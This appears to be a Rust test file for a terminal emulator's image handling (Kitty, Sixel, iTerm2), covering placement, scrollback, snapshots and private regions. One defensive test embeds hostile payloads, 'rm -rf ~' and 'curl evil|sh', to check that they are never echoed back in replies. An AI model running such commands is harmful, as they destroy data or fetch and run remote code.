//! Images in a terminal, end to end through the emulator: what's asked of
//! the owner, what's shown where, and what's answered.

use crate::graphics::{ImageError, ImageKept, ImageSource, KittyData, Pixels};
use crate::{Config, Size, Terminal};

/// A terminal 20 columns by 10 rows, its cells 10 by 20 pixels.
fn terminal() -> Terminal {
    let mut terminal = Terminal::new(Size::new(20, 10).unwrap(), &Config::default());
    terminal.set_cell_pixels(Some([10, 20]));
    terminal
}

/// Feeds `bytes` to `terminal` as its owner does, keeping each image
/// asked for as `keep` says, until all are taken: the requests made.
fn feed(
    terminal: &mut Terminal,
    bytes: &[u8],
    mut keep: impl FnMut(&ImageSource) -> Result<ImageKept, ImageError>,
) -> Vec<ImageSource> {
    let mut asked = Vec::new();
    let mut rest = bytes;
    loop {
        let used = terminal.advance_until_waiting(rest);
        rest = &rest[used..];
        for request in terminal.take_image_requests() {
            let kept = keep(&request.source);
            asked.push(request.source);
            terminal.image_kept(request.token, kept);
        }
        if rest.is_empty() && !terminal.waiting_for_image() {
            return asked;
        }
    }
}

fn image(key: u8, width: u32, height: u32) -> ImageKept {
    ImageKept {
        key: [key; 16],
        width,
        height,
    }
}

/// The pieces of pictures on each screen row, as (picture, col, row).
fn pieces(terminal: &Terminal) -> Vec<Vec<(u32, u16, u16)>> {
    (terminal.grid().rows())
        .map(|row| {
            (row.pieces().iter())
                .map(|p| (p.picture, p.col, p.row))
                .collect()
        })
        .collect()
}

#[test]
fn a_kitty_image_is_kept_shown_at_the_cursor_and_answered() {
    let mut t = terminal();
    // 25 by 30 pixels: 3 columns, 2 rows.
    let asked = feed(&mut t, b"ab\x1b_Ga=T,f=100,i=7;iVBORw0K\x1b\\", |_| {
        Ok(image(1, 25, 30))
    });
    assert_eq!(
        asked,
        [ImageSource::Kitty {
            pixels: Pixels::Png,
            compressed: false,
            data: KittyData::Direct(b"iVBORw0K".to_vec()),
        }]
    );
    let rows = pieces(&t);
    assert_eq!(rows[0], [(1, 2, 0)]);
    assert_eq!(rows[1], [(1, 2, 1)]);
    // On the image's last row, after its last column.
    assert_eq!((t.cursor().line, t.cursor().col), (1, 5));
    assert_eq!(t.take_replies(), b"\x1b_Gi=7;OK\x1b\\");
    let picture = t.picture(1).unwrap();
    assert_eq!(picture.cells, [3, 2]);
    assert_eq!(picture.span, [25 * 64 / 10, 30 * 64 / 20]);
}

#[test]
fn an_image_in_parts_is_kept_once_its_last_part_comes() {
    let mut t = terminal();
    let asked = feed(
        &mut t,
        b"\x1b_Ga=t,f=32,s=1,v=1,i=3,m=1;AAAA\x1b\\\x1b_Gm=1;AAAA\x1b\\\x1b_Gm=0;AA==\x1b\\",
        |_| Ok(image(2, 1, 1)),
    );
    let [
        ImageSource::Kitty {
            data: KittyData::Direct(data),
            pixels,
            ..
        },
    ] = &asked[..]
    else {
        panic!("{asked:?}");
    };
    assert_eq!(data, b"AAAAAAAAAA==");
    assert_eq!(
        *pixels,
        Pixels::Rgba {
            width: 1,
            height: 1
        }
    );
    // Transmitted only: nothing shown, and answered.
    assert!(pieces(&t).iter().all(Vec::is_empty));
    assert_eq!(t.take_replies(), b"\x1b_Gi=3;OK\x1b\\");
    // Then placed, twice, and deleted by its placement.
    t.advance(b"\x1b_Ga=p,i=3,p=1,C=1\x1b\\\x1b_Ga=p,i=3,p=2,C=1,q=1\x1b\\");
    assert_eq!(t.take_replies(), b"\x1b_Gi=3,p=1;OK\x1b\\");
    assert_eq!(pieces(&t)[0].len(), 2);
    t.advance(b"\x1b_Ga=d,d=i,i=3,p=1\x1b\\");
    assert_eq!(pieces(&t)[0].len(), 1);
    t.advance(b"\x1b_Ga=d,d=I,i=3\x1b\\");
    assert!(pieces(&t)[0].is_empty());
    t.advance(b"\x1b_Ga=p,i=3\x1b\\");
    assert_eq!(t.take_replies(), b"\x1b_Gi=3;ENOENT:no such image\x1b\\");
    assert_eq!(t.take_released_images(), [[2; 16]]);
}

#[test]
fn errors_are_answered_in_fixed_words_and_quiet_says_nothing() {
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=T,f=100,i=9;AAAA\x1b\\", |_| {
        Err(ImageError::NotAnImage)
    });
    assert_eq!(
        t.take_replies(),
        b"\x1b_Gi=9;ENODATA:the data is not an image that can be shown\x1b\\"
    );
    feed(&mut t, b"\x1b_Ga=T,f=100,i=9,q=2;AAAA\x1b\\", |_| {
        Err(ImageError::NotAnImage)
    });
    assert!(t.take_replies().is_empty());
    // Both an ID and a number is no command.
    t.advance(b"\x1b_Ga=t,i=1,I=2;AAAA\x1b\\");
    assert_eq!(
        t.take_replies(),
        b"\x1b_Gi=1,I=2;EINVAL:the command is not one that can be done\x1b\\"
    );
    // Without an ID or a number, nothing is ever answered.
    t.advance(b"\x1b_Ga=p\x1b\\");
    assert!(t.take_replies().is_empty());
    // Nor is an answer echoed back, as a program not reading it does.
    t.advance(b"\x1b_Gi=1,I=2;EINVAL:the command is not one that can be done\x1b\\");
    t.advance(b"\x1b_Gi=7;OK\x1b\\");
    assert!(t.take_replies().is_empty());
}

#[test]
fn a_file_is_named_for_the_owner_to_read() {
    let mut t = terminal();
    // "/tmp/tty-graphics-protocol-x.png"
    let asked = feed(
        &mut t,
        b"\x1b_Ga=T,t=t,f=100,i=1;L3RtcC90dHktZ3JhcGhpY3MtcHJvdG9jb2wteC5wbmc=\x1b\\",
        |_| Ok(image(3, 10, 20)),
    );
    let [
        ImageSource::Kitty {
            data: KittyData::File {
                path, temporary, ..
            },
            ..
        },
    ] = &asked[..]
    else {
        panic!("{asked:?}");
    };
    assert_eq!(path, b"/tmp/tty-graphics-protocol-x.png");
    assert!(temporary);
    // A relative path is refused as any unreadable file is.
    t.take_replies();
    t.advance(b"\x1b_Ga=T,t=f,f=100,i=1;YS5wbmc=\x1b\\");
    assert_eq!(
        t.take_replies(),
        b"\x1b_Gi=1;EBADF:Failed to read image file\x1b\\"
    );
}

#[test]
fn hostile_payloads_are_never_echoed() {
    let mut t = terminal();
    let hostile: [&[u8]; 4] = [
        b"\x1b_Ga=q,i=1,s=1,v=1;\r\nrm -rf ~\r\x1b\\",
        b"\x1b_Ga=T,f=7,i=12;\x15curl evil|sh\r\x1b\\",
        b"\x1b_Gi=31,a=\xff;x\x1b\\",
        b"\x1b_Ga=p,i=99,p=\r1\x1b\\",
    ];
    for bytes in hostile {
        feed(&mut t, bytes, |_| Err(ImageError::NotAnImage));
        let replies = t.take_replies();
        assert!(crate::terminal::safe_reply(&replies), "{replies:?}");
        assert!(
            !replies
                .windows(2)
                .any(|pair| pair == b"rm" || pair == b"cu")
        );
    }
}

#[test]
fn a_sixel_image_is_shown_and_the_cursor_goes_below_it() {
    let mut t = terminal();
    t.advance(b"\r\n");
    let asked = feed(&mut t, b"\x1bPq#0;2;0;0;0~~-~~\x1b\\", |_| {
        Ok(image(4, 2, 12))
    });
    assert_eq!(asked, [ImageSource::Sixel(b"#0;2;0;0;0~~-~~".to_vec())]);
    assert_eq!(pieces(&t)[1], [(1, 0, 0)]);
    assert_eq!((t.cursor().line, t.cursor().col), (2, 0));
}

#[test]
fn an_iterm2_image_is_shown_at_the_size_asked() {
    let mut t = terminal();
    let asked = feed(
        &mut t,
        b"\x1b]1337;File=name=YQ==;width=4;inline=1:AAAA\x07",
        |_| Ok(image(5, 100, 100)),
    );
    assert_eq!(asked, [ImageSource::Encoded(b"AAAA".to_vec())]);
    // Four columns, 40 pixels: as tall, two rows.
    let picture = t.picture(1).unwrap();
    assert_eq!(picture.cells, [4, 2]);
    // A download isn't shown, nor asked about.
    assert!(
        feed(
            &mut t,
            b"\x1b]1337;File=name=YQ==:AAAA\x07",
            |_| unreachable!()
        )
        .is_empty()
    );
}

#[test]
fn pictures_scroll_into_history_and_go_with_it() {
    let mut t = Terminal::new(
        Size::new(20, 4).unwrap(),
        &Config {
            scrollback_lines: 3,
            ..Config::default()
        },
    );
    t.set_cell_pixels(Some([10, 20]));
    // Six rows tall, from the bottom: its first two rows scroll into
    // history, after three blank ones, the first of those gone.
    t.advance(b"\x1b[4H");
    feed(&mut t, b"\x1b_Ga=T,f=100,i=1,q=2;AAAA\x1b\\", |_| {
        Ok(image(6, 10, 120))
    });
    let history: Vec<(u64, u16)> = (t.primary().history_pieces(0..10))
        .map(|(line, piece)| (line, piece.row))
        .collect();
    assert_eq!(history, [(3, 0), (3 + 1, 1)]);
    // Printing over it leaves it; scrolling it out of history lets it go,
    // once history has moved on far enough to look.
    t.advance(b"over");
    t.advance(&b"\n".repeat(8));
    t.compact_scrollback();
    assert!(t.picture(1).is_some());
    t.advance(&b"\n".repeat(256));
    t.compact_scrollback();
    assert!(t.picture(1).is_none());
    // Its image is kept by its ID until that's deleted.
    assert!(t.take_released_images().is_empty());
    t.advance(b"\x1b_Ga=d,d=I,i=1\x1b\\");
    assert_eq!(t.take_released_images(), [[6; 16]]);
}

#[test]
fn placing_again_or_deleting_touches_only_the_screen_however_long_history_is() {
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=t,f=100,i=1,q=2;AAAA\x1b\\", |_| {
        Ok(image(1, 10, 20))
    });
    t.advance(b"\x1b_Ga=p,i=1,p=7,q=2\x1b\\");
    // Into history, with a thousand lines after it.
    t.advance(&b"\n".repeat(1000));
    t.compact_scrollback();
    let held = || t.primary().history_pieces(0..u64::MAX).count();
    assert_eq!(held(), 1);
    // Placed again: the first goes from the table at once, and from
    // history only as it's swept.
    t.advance(b"\x1b_Ga=p,i=1,p=7,q=2\x1b\\");
    assert!(t.picture(1).is_none());
    assert_eq!(t.primary().history_pieces(0..u64::MAX).count(), 1);
    // Swept only once history has moved on enough to pay for it.
    t.compact_scrollback();
    assert_eq!(t.primary().history_pieces(0..u64::MAX).count(), 1);
    t.advance(b"\x1b[999H");
    t.advance(&b"\n".repeat(256));
    t.compact_scrollback();
    // The first's piece is gone; the second has scrolled up there too.
    assert!((t.primary().history_pieces(0..u64::MAX)).all(|(_, piece)| piece.picture == 2));
    assert!(t.picture(2).is_some());
    // Deleting by ID finds the picture by its index.
    t.advance(b"\x1b_Ga=d,d=i,i=1,p=7\x1b\\");
    assert!(t.picture(2).is_none());
    assert!(pieces(&t).iter().all(Vec::is_empty));
}

#[test]
fn an_image_sent_in_parts_takes_no_more_than_there_is_room_for_and_can_be_given_up() {
    let mut t = terminal();
    t.set_upload_room(8);
    t.advance(b"\x1b_Ga=t,f=100,i=4,m=1;AAAAAAAA\x1b\\");
    assert!(t.sending_parts());
    assert_eq!(t.sending_images(), 8);
    t.advance(b"\x1b_Gm=0;AAAA\x1b\\");
    assert_eq!(
        t.take_replies(),
        b"\x1b_Gi=4;EFBIG:the image is over the limit for images\x1b\\"
    );
    // One that never ends is given up on, and what it held let go.
    t.set_upload_room(1 << 20);
    t.advance(b"\x1b_Ga=t,f=100,i=5,m=1;AAAA\x1b\\");
    t.abandon_sending();
    assert!(!t.sending_parts());
    assert_eq!(t.sending_images(), 0);
    // An iTerm2 image too: it counts while it comes, and given up on, is
    // never kept, and output goes on after it.
    t.advance(b"\x1b]1337;File=inline=1:AAAA");
    assert!(t.sending_parts());
    assert_eq!(t.sending_images(), "1337File=inline=1:AAAA".len());
    t.abandon_sending();
    assert!(!t.sending_parts());
    let asked = feed(&mut t, b"AAAA\x07after", |_| unreachable!());
    assert!(asked.is_empty());
    assert!(t.screen_text().contains("after"));
    // Nor is one past the room there is.
    t.set_upload_room(8);
    let asked = feed(
        &mut t,
        b"\x1b]1337;File=inline=1:AAAAAAAA\x07",
        |_| unreachable!(),
    );
    assert!(asked.is_empty());
}

#[test]
fn an_iterm2_image_over_the_limit_is_never_kept_whole() {
    let mut t = terminal();
    t.set_image_limit(30);
    let data = "A".repeat(4096 + 41);
    let asked = feed(
        &mut t,
        format!("\x1b]1337;File=inline=1:{data}\x07after").as_bytes(),
        |_| unreachable!(),
    );
    assert!(asked.is_empty());
    assert!(t.screen_text().starts_with("after"));
}

#[test]
fn a_virtual_placements_image_is_pinned_only_while_a_placeholder_shows_it() {
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b_Ga=T,U=1,f=100,i=9,c=1,r=1,q=2;AAAA\x1b\\",
        |_| Ok(image(5, 10, 20)),
    );
    assert!(t.shown_images().is_empty());
    t.advance("\x1b[38;5;9m\u{10EEEE}".as_bytes());
    assert_eq!(t.shown_images(), [[5; 16]].into_iter().collect());
}

#[test]
fn a_full_table_is_swept_once_before_a_picture_is_refused() {
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=t,f=100,i=1,q=2;AAAA\x1b\\", |_| {
        Ok(image(1, 10, 20))
    });
    // As many pictures as are kept, each cleared from the screen at once.
    for _ in 0..super::MOST_PICTURES {
        t.advance(b"\x1b_Ga=p,i=1,q=2,C=1\x1b\\\x1b[2J");
    }
    // A sweep makes room, rather than refusing.
    t.advance(b"\x1b_Ga=p,i=1,C=1\x1b\\");
    assert_eq!(t.take_replies(), b"\x1b_Gi=1;OK\x1b\\");
}

#[test]
fn clearing_the_screen_takes_pictures_away_but_erasing_text_doesnt() {
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b_Ga=T,f=100,i=1,c=2,r=2,q=2;AAAA\x1b\\",
        |_| Ok(image(7, 20, 40)),
    );
    t.advance(b"\x1b[H\x1b[J");
    assert_eq!(pieces(&t)[0].len(), 1);
    t.advance(b"\x1b[2J");
    assert!(pieces(&t).iter().all(Vec::is_empty));
}

#[test]
#[allow(clippy::float_cmp, reason = "halves and wholes, exactly")]
fn placeholders_name_their_image_and_place() {
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b_Ga=T,U=1,f=100,i=42,c=2,r=1,q=2;AAAA\x1b\\",
        |_| Ok(image(8, 20, 10)),
    );
    let virtual_ = *t.virtuals().next().unwrap();
    assert_eq!((virtual_.id, virtual_.cells), (42, [2, 1]));
    // Image 42 in the text's colour, row 0 column 0, then one inferred.
    t.advance("\x1b[38;5;42m\u{10EEEE}\u{0305}\u{0305}\u{10EEEE}".as_bytes());
    let found = super::placeholders(t.grid().row(0));
    assert_eq!(found.len(), 2);
    assert_eq!(
        (found[1].1.image, found[1].1.row, found[1].1.col),
        (42, 0, 1)
    );
    let slice = virtual_.slice(0, 1, [10.0, 20.0]).unwrap();
    // 20 by 10 fitted into 20 by 20 pixels: centred, its right half here.
    assert_eq!(slice.rect, [0.0, 0.25, 1.0, 0.5]);
    assert_eq!(slice.crop, [10.0, 0.0, 10.0, 10.0]);
}

#[test]
fn without_an_owner_an_image_is_given_up_and_output_goes_on() {
    let mut t = terminal();
    t.advance(b"\x1b_Ga=T,f=100,i=5;AAAA\x1b\\after");
    assert!(t.screen_text().starts_with("after"));
    assert_eq!(
        t.take_replies(),
        b"\x1b_Gi=5;EBUSY:too many images at once, try again\x1b\\"
    );
}

#[test]
fn text_copied_says_a_pictures_size_once_and_never_a_placeholder() {
    use crate::Position;
    let mut t = terminal();
    feed(&mut t, b"ab\x1b_Ga=T,f=100,i=1,q=2;AAAA\x1b\\cd", |_| {
        Ok(image(1, 25, 30))
    });
    let start = Position { line: 0, col: 0 };
    let end = Position { line: 1, col: 19 };
    assert_eq!(t.text(start, end, true), "ab[image 25×30]\n     cd");
    feed(&mut t, b"\x1b_Ga=t,U=1,i=2,f=100,q=2;AAAA\x1b\\", |_| {
        Ok(image(2, 7, 9))
    });
    t.advance(b"\x1b_Ga=p,U=1,i=2,q=2\x1b\\");
    t.advance("\r\n\x1b[38;5;2m\u{10EEEE}\u{0305}\u{0305}\u{10EEEE}x".as_bytes());
    let line = Position { line: 2, col: 0 };
    let line_end = Position { line: 2, col: 19 };
    assert_eq!(t.text(line, line_end, true), "[image 7×9]x");
}

#[test]
fn history_kept_across_a_restart_says_pictures_in_words() {
    let mut t = Terminal::new(Size::new(20, 3).unwrap(), &Config::default());
    t.set_cell_pixels(Some([10, 20]));
    feed(&mut t, b"a\x1b_Ga=T,f=100,i=1,q=2;AAAA\x1b\\\r\n", |_| {
        Ok(image(1, 8, 20))
    });
    t.advance(b"\n\n\nlast");
    let kept = t
        .copy_to_keep(100)
        .lines(crate::Keeping::default(), 1 << 20);
    let mut restored = Terminal::new(Size::new(20, 3).unwrap(), &Config::default());
    let history = kept.history(&Config::default(), "restarted").unwrap();
    restored.take_kept_history(history, 0);
    let text = restored.text(
        crate::Position { line: 0, col: 0 },
        crate::Position { line: 9, col: 19 },
        true,
    );
    assert!(text.starts_with("a[image 8×20]\n"), "{text}");
}

#[test]
fn a_snapshot_leaves_out_pictures_no_row_shows_and_their_images() {
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=T,f=100,q=2;AAAA\x1b\\", |_| {
        Ok(image(4, 10, 20))
    });
    t.advance(b"\x1b[2J");
    let graphics = t.graphics_snapshot();
    assert!(graphics.images().is_empty());
}

#[test]
fn pictures_survive_a_snapshot() {
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=T,f=100,i=1,q=2;AAAA\x1b\\", |_| {
        Ok(image(9, 20, 40))
    });
    let snapshot = t.snapshot();
    let graphics = t.graphics_snapshot();
    let mut restored = Terminal::restore(&snapshot, &Config::default()).unwrap();
    restored.restore_graphics(&graphics);
    assert_eq!(pieces(&restored), pieces(&t));
    assert_eq!(restored.picture(1), t.picture(1));
    assert!(restored.take_released_images().is_empty());
    assert_eq!(graphics.images(), [[9; 16]].into_iter().collect());
}

/// A picture shown in a region marked private is as private as text: its
/// rows get the region's hints, and its image is hidden from a client
/// that has them masked (CLACKA-242).
#[test]
fn a_picture_in_a_private_region_is_hidden_with_its_lines() {
    use crate::Hints;
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=T,f=100,i=7;iVBORw0K\x1b\\\r\n", |_| {
        Ok(image(1, 25, 30))
    });
    feed(
        &mut t,
        b"\x1b]46373;region;start;r;secret\x07\x1b_Ga=T,f=100,i=8;iVBORw0K\x1b\\\x1b]46373;region;end;r\x07",
        |_| Ok(image(2, 25, 30)),
    );
    let hidden_rows: Vec<Hints> = (t.grid().rows())
        .filter(|row| row.pieces().iter().any(|piece| piece.picture == 2))
        .map(crate::Row::hints)
        .collect();
    assert_eq!(hidden_rows.len(), 2);
    assert!(hidden_rows.iter().all(|hints| hints.contains(Hints::HIDE)));
    // The second image is placed only on hidden lines: hidden from a
    // window masking HIDE, not from one that masks nothing; the first is
    // shown.
    assert!(t.image_hidden([2; 16], Hints::HIDE));
    assert!(!t.image_hidden([2; 16], Hints::empty()));
    assert!(!t.image_hidden([1; 16], Hints::HIDE | Hints::NOAGENT));
    // An image placed nowhere isn't hidden: there's nothing to hide.
    assert!(!t.image_hidden([9; 16], Hints::HIDE));
    // Shown as it is, its lines' pictures are: but only both of its lines.
    let rows = |t: &Terminal| -> Vec<u64> {
        let end = t.primary().scrollback_end();
        (t.grid().rows().zip(end..))
            .filter(|(row, _)| row.pieces().iter().any(|piece| piece.picture == 2))
            .map(|(_, line)| line)
            .collect()
    };
    let lines = rows(&t);
    assert!(!t.image_hidden_unless([2; 16], Hints::HIDE, &|line, _| lines.contains(&line)));
    assert!(!t.image_hidden_unless([2; 16], Hints::HIDE, &|line, _| line == lines[0]));
    assert!(t.image_hidden_unless([2; 16], Hints::HIDE, &|line, _| line == lines[0] + 9));
    // Scrolled into history, it's still hidden, and shown by its lines.
    t.advance(b"\r\n".repeat(20).as_slice());
    assert!(t.image_hidden([2; 16], Hints::HIDE));
    assert!(!t.image_hidden_unless([2; 16], Hints::HIDE, &|line, _| line == lines[1]));
}

/// What agents read of a line kept from them says nothing of its
/// pictures; history kept across a restart says nothing of the pictures
/// on a line never to be written to disk.
#[test]
fn pictures_on_private_lines_are_never_said() {
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b]46373;region;start;r;private\x07\x1b_Ga=T,f=100,i=8;iVBORw0K\x1b\\\x1b]46373;region;end;r\x07\r\n",
        |_| Ok(image(2, 25, 30)),
    );
    let (first, last) = t.document_bounds();
    let (from, to) = (
        crate::Position {
            line: first,
            col: 0,
        },
        crate::Position { line: last, col: 0 },
    );
    assert!(t.text(from, to, true).contains("[image 25×30]"));
    assert!(!t.text_for_agents(from, to, true).contains("[image"));
    let kept = t
        .copy_to_keep(100)
        .lines(crate::Keeping::default(), 1 << 20);
    assert!(
        kept.texts().iter().all(|text| !text.contains("[image")),
        "{:?}",
        kept.texts()
    );
}

/// A virtual placement made in a region, or whose placeholder is printed
/// in one, is as private as the region: its image is hidden wherever its
/// placeholders are, on screen, gone, or not printed yet (CLACKA-242).
#[test]
fn a_virtual_placement_made_or_shown_in_a_region_hides_its_image() {
    use crate::Hints;
    // Made in a region, with no placeholder anywhere.
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b]46373;region;start;r;secret\x07\x1b_Ga=T,U=1,f=100,i=9,c=1,r=1,q=2;AAAA\x1b\\\x1b]46373;region;end;r\x07",
        |_| Ok(image(5, 10, 20)),
    );
    let virtual_ = *t.virtuals().next().unwrap();
    assert_eq!(
        t.virtual_hints(&virtual_),
        Hints::HIDE | Hints::NOSAVE | Hints::NOAGENT
    );
    assert!(t.image_hidden([5; 16], Hints::HIDE));
    // Its placeholder printed outside the region shows nothing more.
    t.advance("\x1b[38;5;9m\u{10EEEE}\x1b[m".as_bytes());
    assert!(t.image_hidden([5; 16], Hints::HIDE));
    assert!(!t.image_hidden([5; 16], Hints::empty()));
    // Made outside one, but its placeholder printed in one, then cleared.
    let mut t = terminal();
    feed(
        &mut t,
        b"\x1b_Ga=T,U=1,f=100,i=9,c=1,r=1,q=2;AAAA\x1b\\",
        |_| Ok(image(6, 10, 20)),
    );
    assert!(!t.image_hidden([6; 16], Hints::HIDE));
    t.advance("\x1b]46373;region;start;r;noagent\x07\x1b[38;5;9m\u{10EEEE}\x1b]46373;region;end;r\x07\x1b[2J".as_bytes());
    assert!(t.image_hidden([6; 16], Hints::NOAGENT));
    assert!(!t.image_hidden([6; 16], Hints::HIDE));
}

/// A picture on the main screen is judged by its own line's hints, not
/// by the alternate screen's row of the same number.
#[test]
fn a_main_screen_picture_isnt_hidden_by_the_alternate_screen() {
    use crate::Hints;
    let mut t = terminal();
    feed(&mut t, b"\x1b_Ga=T,f=100,i=7;iVBORw0K\x1b\\", |_| {
        Ok(image(1, 25, 30))
    });
    // The alternate screen, its first rows hidden.
    t.advance(
        b"\x1b[?1049h\x1b[H\x1b]46373;region;start;r;hide\x07x\r\ny\x1b]46373;region;end;r\x07",
    );
    assert!(!t.image_hidden([1; 16], Hints::HIDE));
}

/// A picture laid over rows as the region's cap is reached gets the
/// region's hints on every one of its rows.
#[test]
fn every_row_of_a_picture_gets_its_regions_hints_though_the_cap_closes_it() {
    use crate::Hints;
    let mut t = terminal();
    t.advance(b"\x1b]46373;region;start;r;noagent\x07");
    let lines = "x\r\n".repeat(usize::try_from(crate::regions::MOST_LINES).unwrap() - 1);
    t.advance(lines.as_bytes());
    assert!(t.has_regions());
    // 30 pixels tall: 2 rows, the second past the cap.
    feed(&mut t, b"\x1b_Ga=T,f=100,i=7;iVBORw0K\x1b\\", |_| {
        Ok(image(1, 25, 30))
    });
    assert!(!t.has_regions());
    let rows: Vec<Hints> = (t.grid().rows())
        .filter(|row| !row.pieces().is_empty())
        .map(crate::Row::hints)
        .collect();
    assert_eq!(rows.len(), 2);
    assert!(
        rows.iter().all(|hints| hints.contains(Hints::NOAGENT)),
        "{rows:?}"
    );
}
